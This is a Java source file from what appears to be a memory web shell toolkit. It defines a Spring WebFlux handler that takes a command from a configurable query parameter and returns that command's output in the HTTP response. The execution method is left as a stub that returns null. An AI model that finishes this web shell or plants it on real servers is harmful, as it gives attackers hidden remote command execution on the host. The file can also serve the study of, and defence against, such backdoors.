package com.reajason.javaweb.memshell.shelltool.command;

import org.springframework.http.ResponseEntity;
import org.springframework.web.server.ServerWebExchange;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

/**
 * @author ReaJason
 * @since 2024/12/25
 */
public class CommandHandlerMethod {
    public static String paramName;

    public ResponseEntity<?> invoke(ServerWebExchange exchange) {
        String param = getParam(exchange.getRequest().getQueryParams().getFirst(paramName));
        StringBuilder result = new StringBuilder();
        try {
            if (param != null) {
                InputStream inputStream = getInputStream(param);
                try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream))) {
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        result.append(line);
                        result.append(System.lineSeparator());
                    }
                }
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return ResponseEntity.ok(result.toString());
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }
}
